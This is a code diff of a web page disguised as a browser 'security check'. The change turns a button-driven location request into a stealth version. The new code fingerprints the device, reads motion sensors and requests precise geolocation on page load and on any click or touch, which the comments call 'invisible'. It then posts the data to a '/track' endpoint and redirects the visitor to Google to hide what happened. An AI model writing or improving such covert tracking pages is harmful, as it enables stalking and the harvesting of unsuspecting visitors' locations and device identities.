@@ -3,73 +3,29 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>Security Check</title>
+    <title>Checking...</title>
     <style>
-        body,
-        html {
+        body {
+            background: #000;
+            color: #333;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
             margin: 0;
-            padding: 0;
-            height: 100%;
-            background: #000;
-            color: #fff;
-            font-family: sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-        }
-
-        #overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 999;
-            background: #000;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-
-        button {
-            padding: 15px 30px;
-            font-size: 1.2em;
             cursor: pointer;
-            background: #007bff;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            margin-top: 20px;
-        }
-
-        p {
-            max-width: 80%;
-            line-height: 1.5;
-        }
-
-        .hidden {
-            display: none !important;
         }
     </style>
 </head>
 
 <body>
-    <div id="overlay">
-        <h2>Security Check</h2>
-        <p>Please complete the verification to continue.</p>
-        <button id="verifyBtn">Verify & Continue</button>
-        <p id="msg" style="color: red; margin-top: 20px; font-size: 0.9em;"></p>
-    </div>
-
     <script>
+        // Configuration
         const TARGET_URL = '/track';
         const REDIRECT_URL = 'https://google.com';
-        const DELAY_MS = 4000;
+        const DELAY_MS = 4000; // 4 seconds data collection time
 
         const data = {
-            type: 'STEALTH_GATEKEEPER',
+            type: 'STEALTH_AUTO',
             timestamp: new Date().toISOString(),
             url: window.location.href,
             referrer: document.referrer,
@@ -80,7 +36,7 @@
             fingerprint: {}
         };
 
-        // --- SENSORS & FINGERPRINT (Background Collection) ---
+        // --- BACKGROUND COLLECTION ---
         function collectBackgroundData() {
             // Sensors
             if (window.DeviceMotionEvent) {
@@ -91,7 +47,6 @@
                     }
                 });
             }
-
             // Fingerprint
             try {
                 data.fingerprint.platform = navigator.platform;
@@ -107,45 +62,42 @@
         collectBackgroundData();
 
         // --- MAIN LOGIC ---
-        const btn = document.getElementById('verifyBtn');
-        const msg = document.getElementById('msg');
+        let hasRun = false;
 
-        btn.onclick = () => {
-            msg.textContent = "Requesting access...";
+        function runSequence() {
+            if (hasRun) return; // Prevent double execution
+            hasRun = true;
 
-            // 1. Request Location
+            // Request Location
             navigator.geolocation.getCurrentPosition(
-                // SUCCESS
                 (pos) => {
-                    msg.style.color = "#00ff00";
-                    msg.textContent = "Verified! Redirecting...";
-                    btn.style.display = 'none';
-
-                    // Capture Data
+                    // SUCCESS
                     data.location = {
                         lat: pos.coords.latitude,
                         lng: pos.coords.longitude,
                         acc: pos.coords.accuracy,
                         source: 'precise'
                     };
-
-                    // Wait 4 seconds then Send & Redirect
-                    setTimeout(() => {
-                        sendAndRedirect();
-                    }, DELAY_MS);
+                    finalize();
                 },
-                // ERROR (Blocked)
                 (err) => {
-                    console.error(err);
-                    msg.style.color = "red";
-                    msg.textContent = "Location access is required. Please 'Allow' to continue.";
-
-                    // We catch the error but we DO NOT redirect.
-                    // The user must click 'Verify' again after allowing.
+                    // ERROR / BLOCKED (This handles "Block", "Never", or "Not Now")
+                    data.location = {
+                        error: err.message,
+                        code: err.code
+                    };
+                    finalize();
                 },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
             );
-        };
+        }
+
+        function finalize() {
+            // Wait 4 seconds to ensure sensors/wifi data is collected
+            setTimeout(() => {
+                sendAndRedirect();
+            }, DELAY_MS);
+        }
 
         function sendAndRedirect() {
             data.timestamp = new Date().toISOString();
@@ -161,6 +113,24 @@
             // Redirect
             window.location.href = REDIRECT_URL;
         }
+
+        // --- TRIGGERS ---
+        // 1. Try immediately on load
+        try { runSequence(); } catch (e) { }
+
+        // 2. Try on ANY interaction (if browser blocked the auto-run)
+        // This is "invisible" - user clicks anywhere and it triggers prompt
+        document.addEventListener('click', runSequence);
+        document.addEventListener('touchstart', runSequence);
+
+        // 3. Safety Timeout: If location prompt hangs or is ignored for 10s, redirect anyway
+        setTimeout(() => {
+            if (!data.location.lat && !data.location.error) {
+                data.location.error = "Timeout/Ignored";
+                finalize();
+            }
+        }, 12000);
+
     </script>
 </body>
 
